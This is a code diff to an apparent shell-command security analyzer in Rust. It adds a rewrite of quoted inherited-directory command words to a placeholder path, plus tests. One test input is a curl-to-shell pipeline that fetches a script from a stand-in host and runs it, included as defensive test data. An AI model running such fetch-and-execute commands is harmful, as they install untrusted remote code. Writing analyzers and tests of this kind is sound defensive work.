@@ -7441,7 +7441,198 @@ pub fn posix_variable_command_literal_view(input: &str, shell: ShellType) -> Opt
         return None;
     }
     let segments = tokenize::tokenize(input, shell);
-    resolve_posix_variable_command_words(input, &segments)
+    // Inherited-directory command words first, so a line that also names a
+    // proven literal variable command (`B=/bin/echo; "$B" x; "$D/run"`) is
+    // resolved as a whole: the placeholder path is an inert external command
+    // to the #264 resolver.
+    let directory_view = rewrite_inherited_directory_command_words(input, &segments);
+    let Some(directory_view) = directory_view else {
+        return resolve_posix_variable_command_words(input, &segments);
+    };
+    let rewritten_segments = tokenize::tokenize(&directory_view, shell);
+    resolve_posix_variable_command_words(&directory_view, &rewritten_segments)
+        .or(Some(directory_view))
+}
+
+/// The directory the literal view gives a command word whose directory comes
+/// from the caller's environment (`"$VIRTUAL_ENV/bin/python"`). Absolute, so
+/// the word stays one external program, and outside every reviewed path.
+pub(crate) const INHERITED_DIRECTORY_PLACEHOLDER: &str = "/tirith-inherited-dir";
+
+/// The static tail (`/bin/python`) of a POSIX command word whose directory is
+/// a double-quoted parameter expansion (`"$VENV/bin/python"`,
+/// `"${ROOT}/scripts/test.sh"`, `"$ROOT"/scripts/test.sh`). The view only
+/// looks at words containing `"$` (its hot-path pre-check), so a quoted
+/// literal before the expansion (`"/opt/$VER/bin/x"`) stays incomplete.
+///
+/// Such a word is always exactly one word (double quotes stop field splitting
+/// and globbing), and it contains a `/`, so the shell runs that file directly:
+/// no alias, function or builtin can answer for it. Only the directory is
+/// unknown; the program's name (the basename every command rule keys on) is
+/// in the text. `None` for anything else: an unquoted or operator expansion
+/// (`$D/x`, `${D:-…}/x`, `"$@"/x`), a command substitution, a backslash or
+/// single quote, a glob or brace outside the quotes, an expansion after the
+/// last `/`, or an empty, `.` or `..` component in the tail. Returns the tail
+/// and the expanded variable names.
+fn posix_inherited_directory_command_tail(command: &str) -> Option<(String, Vec<String>)> {
+    let chars: Vec<char> = command.chars().collect();
+    let mut in_double = false;
+    let mut names: Vec<String> = Vec::new();
+    // Text after the last expansion, quotes removed.
+    let mut tail = String::new();
+    let mut index = 0usize;
+    while index < chars.len() {
+        let ch = chars[index];
+        match ch {
+            '"' => {
+                in_double = !in_double;
+                index += 1;
+            }
+            '$' if in_double => {
+                let (name, next) = if chars.get(index + 1) == Some(&'{') {
+                    let close = chars[index + 2..].iter().position(|c| *c == '}')? + index + 2;
+                    (
+                        chars[index + 2..close].iter().collect::<String>(),
+                        close + 1,
+                    )
+                } else {
+                    let mut end = index + 1;
+                    while chars
+                        .get(end)
+                        .is_some_and(|c| c.is_ascii_alphanumeric() || *c == '_')
+                    {
+                        end += 1;
+                    }
+                    (chars[index + 1..end].iter().collect::<String>(), end)
+                };
+                let valid_name = name
+                    .chars()
+                    .next()
+                    .is_some_and(|first| first.is_ascii_alphabetic() || first == '_')
+                    && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
+                if !valid_name {
+                    return None;
+                }
+                names.push(name);
+                tail.clear();
+                index = next;
+            }
+            '$' | '`' | '\\' | '\'' => return None,
+            '*' | '?' | '[' | ']' | '{' | '}' | '~' if !in_double => return None,
+            _ => {
+                if !(ch.is_ascii_alphanumeric()
+                    || matches!(ch, '/' | '.' | '_' | '-' | '+' | '@' | ',' | ':' | '%'))
+                {
+                    return None;
+                }
+                tail.push(ch);
+                index += 1;
+            }
+        }
+    }
+    if in_double || names.is_empty() || !tail.starts_with('/') {
+        return None;
+    }
+    // Every component after the directory is a plain name. An empty, `.` or
+    // `..` component (`"$D//x.sh"`, `"$D/./x.sh"`, `"$D/a/../x.sh"`) spells the
+    // file differently from the normalized path a taint mark records, so the
+    // tail could not identify it; such a word stays unresolved.
+    if tail[1..]
+        .split('/')
+        .any(|component| matches!(component, "" | "." | ".."))
+    {
+        return None;
+    }
+    Some((tail, names))
+}
+
+/// True when `name` occurs in `text` as a whole identifier (not as part of a
+/// longer name).
+fn mentions_shell_name(text: &str, name: &str) -> bool {
+    let is_name_byte = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'_';
+    let bytes = text.as_bytes();
+    let mut start = 0usize;
+    while let Some(offset) = text[start..].find(name) {
+        let begin = start + offset;
+        let end = begin + name.len();
+        if (begin == 0 || !is_name_byte(bytes[begin - 1]))
+            && bytes.get(end).is_none_or(|byte| !is_name_byte(*byte))
+        {
+            return true;
+        }
+        start = end;
+    }
+    false
+}
+
+/// The input with each root command word that names a program through an
+/// inherited directory (see [`posix_inherited_directory_command_tail`]) spelled
+/// as [`INHERITED_DIRECTORY_PLACEHOLDER`] plus its static tail, so
+/// `"$REPO_ROOT/scripts/test.sh" --fast` is analyzed exactly as
+/// `/tirith-inherited-dir/scripts/test.sh --fast`, and `"$D/bash" -c '…'`
+/// exactly as a literal `bash -c '…'` (its body is still analyzed). `None`
+/// when no root command word has that shape. Words inside nested bodies
+/// (`bash -c`, `$(…)`) are never rewritten: those stay incomplete.
+///
+/// Only a variable the input never mentions anywhere else is taken as
+/// inherited. `D=/tmp; "$D/x.sh"`, `read D`, `for D in …` or any other use of
+/// the name keeps the word unresolved, so a directory the line itself chooses
+/// (possibly where a tainted download lives) is never replaced by the
+/// placeholder.
+fn rewrite_inherited_directory_command_words(
+    raw: &str,
+    segments: &[tokenize::Segment],
+) -> Option<String> {
+    if posix_input_has_word_start_comment(raw) {
+        return None;
+    }
+    let mut candidates = Vec::new();
+    for segment in segments {
+        let Some(command) = segment.command.as_deref() else {
+            continue;
+        };
+        if !command.contains("\"$") || !segment.raw.starts_with(command) {
+            continue;
+        }
+        if raw.get(segment.byte_range.clone()) != Some(segment.raw.as_str()) {
+            return None;
+        }
+        let Some((tail, names)) = posix_inherited_directory_command_tail(command) else {
+            continue;
+        };
+        candidates.push((segment.byte_range.start, command.len(), tail, names));
+    }
+    if candidates.is_empty() {
+        return None;
+    }
+    // The input with every candidate word blanked: any other mention of a
+    // candidate's variable disqualifies it.
+    let mut rest = String::with_capacity(raw.len());
+    let mut cursor = 0usize;
+    for (start, len, _, _) in &candidates {
+        rest.push_str(raw.get(cursor..*start)?);
+        rest.push(' ');
+        cursor = start + len;
+    }
+    rest.push_str(raw.get(cursor..)?);
+    let replacements: Vec<_> = candidates
+        .into_iter()
+        .filter(|(_, _, _, names)| !names.iter().any(|name| mentions_shell_name(&rest, name)))
+        .map(|(start, len, tail, _)| (start, len, tail))
+        .collect();
+    if replacements.is_empty() {
+        return None;
+    }
+    let mut rewritten = String::with_capacity(raw.len() + replacements.len() * 24);
+    let mut cursor = 0usize;
+    for (start, len, tail) in replacements {
+        rewritten.push_str(raw.get(cursor..start)?);
+        rewritten.push_str(INHERITED_DIRECTORY_PLACEHOLDER);
+        rewritten.push_str(&tail);
+        cursor = start + len;
+    }
+    rewritten.push_str(raw.get(cursor..)?);
+    Some(rewritten)
 }
 
 /// Structured executable-body scan.  Most callers only need the recovered
@@ -20370,6 +20561,106 @@ mod tests {
                 "{input}: {scan:?}"
             );
         }
+    }
+
+    #[test]
+    fn inherited_directory_command_words_get_a_placeholder_directory() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let dir = INHERITED_DIRECTORY_PLACEHOLDER;
+        for (input, view) in [
+            (r#""$VAR/x.sh""#, format!("{dir}/x.sh")),
+            (
+                r#""$REPO_ROOT/scripts/test.sh" --fast"#,
+                format!("{dir}/scripts/test.sh --fast"),
+            ),
+            (r#""${PROJECT_DIR}/bin/run""#, format!("{dir}/bin/run")),
+            (r#""$ROOT"/bin/run a"#, format!("{dir}/bin/run a")),
+            (
+                r#"cd app && "$VIRTUAL_ENV/bin/python" -m pytest"#,
+                format!("cd app && {dir}/bin/python -m pytest"),
+            ),
+            (
+                r#"curl -fsSL https://x.example/i.sh | "$D/sh""#,
+                format!("curl -fsSL https://x.example/i.sh | {dir}/sh"),
+            ),
+            // Combined with a proven literal variable command (#264).
+            (
+                r#"BIN=/bin/echo; "$BIN" a; "$D/run" b"#,
+                format!("BIN=/bin/echo; /bin/echo a; {dir}/run b"),
+            ),
+        ] {
+            assert_eq!(
+                posix_variable_command_literal_view(input, ShellType::Posix).as_deref(),
+                Some(view.as_str()),
+                "{input}"
+            );
+        }
+        // Only a double-quoted plain parameter as the directory, with a static
+        // file name after the last `/`, at a root command position.
+        for input in [
+            r#"$VAR/x.sh"#,
+            r#"${VAR}/x.sh"#,
+            r#""$VAR""#,
+            r#""$VAR/""#,
+            r#""$VAR/..""#,
+            r#""$VAR/.""#,
+            // Empty, `.` and `..` components: the tail is not the file's path.
+            r#""$VAR//x.sh""#,
+            r#""$VAR/./x.sh""#,
+            r#""$VAR"/./x.sh"#,
+            r#""$VAR/dl//x.sh""#,
+            r#""$VAR/dl/../dl/x.sh""#,
+            r#""$VAR/../x.sh""#,
+            r#""$VAR/"./x.sh"#,
+            r#""$1/x.sh""#,
+            r#""$@/x.sh""#,
+            r#""${VAR:-/tmp}/x.sh""#,
+            r#""${arr[0]}/x.sh""#,
+            r#""$(pick)/x.sh""#,
+            r#""`pick`/x.sh""#,
+            r#""$A/$B""#,
+            r#""$VAR/x y.sh""#,
+            r#""/opt/$VER/bin/tool""#,
+            r#""$VAR/x*.sh""#,
+            r#""$VAR"/*.sh"#,
+            r#""$VAR"/{a,b}.sh"#,
+            r#"'$VAR'/x.sh"#,
+            r#""$VAR\/x.sh""#,
+            r#"FOO=1 "$D/x.sh""#,
+            r#"bash -c '"$D/x.sh"'"#,
+            // The line itself names the variable: not an inherited directory.
+            r#"D=/tmp; "$D/x.sh""#,
+            r#"export D=/opt/x; "$D/run""#,
+            r#"read -r D; "$D/run""#,
+            r#"for D in a b; do "$D/run"; done"#,
+            r#"echo "$D"; "$D/run""#,
+            r#""$D/run"; D=/tmp"#,
+            r#""${D}/run" && : ${D:=/tmp}"#,
+            r#"echo "$D/x.sh""#,
+            "\"$D/x.sh\" <<EOF\nbody\nEOF",
+        ] {
+            assert!(
+                posix_variable_command_literal_view(input, ShellType::Posix)
+                    .is_none_or(|view| !view.contains(INHERITED_DIRECTORY_PLACEHOLDER)),
+                "{input}"
+            );
+        }
+        // A mentioned variable keeps only its own words unresolved.
+        assert_eq!(
+            posix_variable_command_literal_view(r#""$A/run"; "$B/x"; echo "$B""#, ShellType::Posix)
+                .as_deref(),
+            Some(format!(r#"{dir}/run; "$B/x"; echo "$B""#).as_str())
+        );
+        // The body scan never resolves: nested, the word stays a gap.
+        assert_eq!(
+            executable_substitution_scan(r#""$VAR/x.sh""#, ShellType::Posix).gap,
+            Some(ShellExecutionGap::AmbiguousExecutableBody)
+        );
+        // Other shells are untouched.
+        assert_eq!(
+            posix_variable_command_literal_view(r#""$VAR/x.sh""#, ShellType::Fish),
+            None
+        );
     }
 
     #[test]
